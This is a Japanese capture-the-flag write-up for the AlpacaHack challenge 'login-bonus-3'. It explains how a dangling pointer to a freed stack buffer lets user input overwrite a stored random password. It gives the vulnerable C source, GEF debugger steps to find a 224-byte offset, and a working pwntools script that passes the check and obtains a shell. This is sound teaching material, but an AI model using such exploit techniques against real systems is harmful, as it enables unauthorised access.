# ■ Writeup::login-bonus-3
[login-bonus-3 - AlpacaHack](https://alpacahack.com/challenges/login-bonus-3)

# 1. Solution
`generate_password()` において `password` は `secret` が確保した領域を指しているが, `generate_password()` を抜けた時点で `secret` を指していた `password` が解放済みメモリへのポインタ(Dangling Pointer) となる.

`auth()` では `input` に対して256bytesまで入力でき, Use-After-Freeによって `password` が指している領域を任意のバイト列で書き換えられる.

また, `input` から `password` までのoffsetは解析によって224bytesであるとわかる.

- `solve.py`:
```python
#!/home/arch/venv/bin/python
from pwn import *

_, HOST, PORT = 'nc localhost 9999'.split()
io = remote(HOST, PORT)
# io = process('./login')

passwd = b'DUMMY_PASSWORD__' # 16bytes

payload = passwd + b'\x00'
payload += b'A' * (224 - 16 - 1) # padding
payload += passwd  # 'password' area
io.sendlineafter(b'Password: ', payload)

io.interactive()
```

# 2. Explanation
## 2.0. Condition
- `login.c`:
```C
 1	#include <stdlib.h>
 2	#include <string.h>
 3	#include <sys/random.h>
 4	#include <unistd.h>
 5	#include <stdio.h>
 6	
 7	#define LEN_PWD 16
 8	
 9	void generate_password(char **password) {
10	  int seed;
11	  char secret[32] = {};
12	  *password = secret;
13	
14	  /* Generate random password */
15	  getrandom(&seed, sizeof(seed), 0);
16	  srand(seed);
17	  for (size_t i = 0; i < LEN_PWD; i++)
18	    secret[i] = 'A' + (rand() % 26);
19	}
20	
21	void auth(const char *password) {
22	  char input[256];
23	  input[sizeof(input) - 1] = '\0';
24	
25	  /* Input password */
26	  write(1, "Password: ", 10);
27	  for (size_t i = 0; i < sizeof(input) - 1; i++) {
28	    if (read(0, input + i, 1) != 1 || input[i] == '\n') {
29	      input[i] = '\0';
30	      break;
31	    }
32	  }
33	
34	  /* Check password */
35	  if (strlen(input) != LEN_PWD || strcmp(input, password)) {
36	    write(1, "[-] Wrong password\n", 19);
37	  } else {
38	    write(1, "[+] Success\n", 12);
39	    system("/bin/sh");
40	  }
41	}
42	
43	int main(int argc, char **argv) {
44	  char *password;
45	  generate_password(&password);
46	  auth(password);
47	  return 0;
48	}
```

## 2.1. UAF(Use-After-Free)
`generate_password()` はスタック上のローカル変数である `secret` を `password` に書き込む. `generate_password()` を抜けた時点で `secret` のスタックフレームが解放されているが, `password` はここを指したままの状態となり, Dangling Pointerとなる.

`auth()` が呼ばれるとスタック領域は `generate_password()` が使っていた領域と重なり, `input[256]` によって一部を書き換えられる.

## 2.2. offset

- `input` への入力後に `printf("%s\n", password)` で出力を確認して計算する.
- GEFの`pattern create`, `pattern search` によって確認.

などで求められる. GEFを用いてoffsetを求める手順は以下の通り.:

1. `input` への入力後の適当な位置にbpを敷く. 

```bash
gef➤  disassemble auth
Dump of assembler code for function auth:
   0x0000000000401271 <+0>:     push   rbp
   0x0000000000401272 <+1>:     mov    rbp,rsp
...
   0x0000000000401389 <+280>:   nop
   0x000000000040138a <+281>:   mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040138e <+285>:   sub    rax,QWORD PTR fs:0x28
   0x0000000000401397 <+294>:   je     0x40139e <auth+301>
   0x0000000000401399 <+296>:   call   0x401050 <__stack_chk_fail@plt>
   0x000000000040139e <+301>:   leave
   0x000000000040139f <+302>:   ret
End of assembler dump.
gef➤  b *auth+280
Breakpoint 1 at 0x401389
```

2. 255bytesのpattern文字列を作成し, `input` に入力.

```bash
gef➤  pattern create 256
[+] Generating a pattern of 256 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
[+] Saved as '$_gef0'
gef➤  c
Continuing.
Password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
```


3. `pattern search` でスタック領域内にある `password` が持つパターンを指定し, offsetを計算.
contextで表示されているスタック領域を見てもいいし, `rsp` をダンプしてもいい.

```bash
gef➤  context stack
───────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbf0│+0x0000: 0x0000000002000000   ← $rsp
0x00007fffffffdbf8│+0x0008: 0x00007fffffffdcf0  →  "daaaaaabeaaaaaabfaaaaaabgaaaaaa"
0x00007fffffffdc00│+0x0010: 0x0000000000000002
0x00007fffffffdc08│+0x0018: 0x00000000000000ff
0x00007fffffffdc10│+0x0020: "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
0x00007fffffffdc18│+0x0028: "baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha[...]"
0x00007fffffffdc20│+0x0030: "caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia[...]"
0x00007fffffffdc28│+0x0038: "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"
────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
gef➤  x/6gx $rsp
0x7fffffffdbf0: 0x0000000002000000      0x00007fffffffdcf0
0x7fffffffdc00: 0x0000000000000002      0x00000000000000ff
0x7fffffffdc10: 0x6161616161616161      0x6161616161616162
gef➤  x/s 0x00007fffffffdcf0
0x7fffffffdcf0: "daaaaaabeaaaaaabfaaaaaabgaaaaaa"
```

searchするpatternは `"daaaaaabeaaaaaabfaaaaaabgaaaaaa"` だとわかったので, これで検索.

```bash
gef➤  pattern search daaaaaabeaaaaaabfaaaaaabgaaaaaa
[+] Searching for '61616161616167626161616161616662616161616161656261616161616164'/'64616161616161626561616161616162666161616161616267616161616161' with period=8
[+] Found at offset 224 (big-endian search)
```

よってoffsetは224bytesとわかる.

## 2.3. exploit

- `input` の文字列長は16bytes

```C
7	#define LEN_PWD 16
...
35	  if (strlen(input) != LEN_PWD || strcmp(input, password)) {
```

- `input` から Dangling Pointer `password` までのoffsetは224bytes.

これらを組み合わせて, `input` には

1. 16文字の任意の文字列を指定したあと, NULL終端を付加する.
2. $224 - 16 - 1 = 207$ より, 207bytesのPaddingを挟む. ( $-1$ はNULL終端の1byte分)
3. 1.で指定した文字列を最後につける.

を満たす任意のバイト列を渡せば良い.

たとえば `solve.py` では,

1. `passwd = b'DUMMY_PASSWORD__'`, `payload = passwd + b'\x00'` で16bytesの文字列とNULL終端を指定.
2. `payload += b'A' * (224 - 16 - 1)` で207bytesのPaddingを追加.
3. `payload += passwd` で1.で指定した文字列を付加.

している.